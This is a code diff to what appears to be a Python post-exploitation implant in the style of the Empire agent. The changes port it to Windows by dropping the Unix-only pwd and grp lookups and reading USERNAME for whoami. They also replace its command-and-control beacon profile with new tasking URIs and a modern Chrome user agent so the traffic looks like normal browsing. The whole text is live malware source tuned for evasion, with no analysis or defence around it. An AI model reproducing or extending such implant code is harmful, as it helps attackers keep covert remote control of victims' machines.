@@ -19,11 +19,11 @@ import imp
 import marshal
 import re
 import shutil
-import pwd
+#import pwd
 import socket
 import math
 import stat
-import grp
+#import grp
 from stat import S_ISREG, ST_CTIME, ST_MODE
 from os.path import expanduser
 from StringIO import StringIO
@@ -40,7 +40,8 @@ from threading import Thread
 
 # profile format ->
 #   tasking uris | user agent | additional header 1 | additional header 2 | ...
-profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
+#profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
+profile = "/login,/status|Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
 
 if server.endswith("/"): server = server[0:-1]
 
@@ -907,8 +908,10 @@ def directory_listing(path):
         else:
             permstr = "-{}".format(permstr)
 
-        user = pwd.getpwuid(fstat.st_uid)[0]
-        group = grp.getgrgid(fstat.st_gid)[0]
+        #user = pwd.getpwuid(fstat.st_uid)[0]
+        #group = grp.getgrgid(fstat.st_gid)[0]
+        user = "unknown"
+        group = "unknown"
 
         # Convert file size to MB, KB or Bytes
         if (fstat.st_size > 1024 * 1024):
@@ -961,7 +964,8 @@ def run_command(command, cmdargs=None):
         return "Created directory: {}".format(cmdargs)
 
     elif re.compile("(whoami|getuid)").match(command):
-        return pwd.getpwuid(os.getuid())[0]
+        #return pwd.getpwuid(os.getuid())[0]
+        return os.getenv("USERNAME")
 
     elif re.compile("hostname").match(command):
         return str(socket.gethostname())
